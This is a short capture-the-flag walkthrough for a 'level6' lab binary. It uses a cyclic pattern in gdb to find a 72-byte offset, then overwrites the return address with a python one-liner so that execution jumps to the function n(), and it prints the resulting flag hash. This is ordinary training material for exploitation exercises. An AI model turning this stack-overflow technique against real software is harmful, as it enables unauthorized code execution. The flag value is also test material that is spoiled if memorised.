# Walkthrough

**Main** : 
The goal is to exploit the vulnerability of `strcpy` , filled the buffer until blow the stack frame to force the register `eip` to execute what we want , in our case we wan executed the `n()`

**Process**:  
>   1. Find the offset
>     2. Get address of `n()`
>    3. Pass payload

## Step 1

### Find the offset 

To the find the offset i used a  [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) 

    (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
    Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
    
    Program received signal SIGSEGV, Segmentation fault.
    0x41346341 in ?? ()
    (gdb) 

    (gdb) print &o 
    $1 = (<text variable, no debug info> *) 0x80484a4 <o>

The offset is `0x41346341` = `72` 

## Step 2 
### Get address of `n()`

```
(gdb) print &n
$2 = (<text variable, no debug info> *) 0x8048454 <n>
```
*The address `0x8048454` it convert in little-endian format `\x54\x84\x04\x08`*

## Step 3 

### Step 1 : Load payload

passe the pass as parameter
*The address `0x8048454` it convert in little-endian format `\x54\x84\x04\x08`*
```
level6@RainFall:~$ ./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```


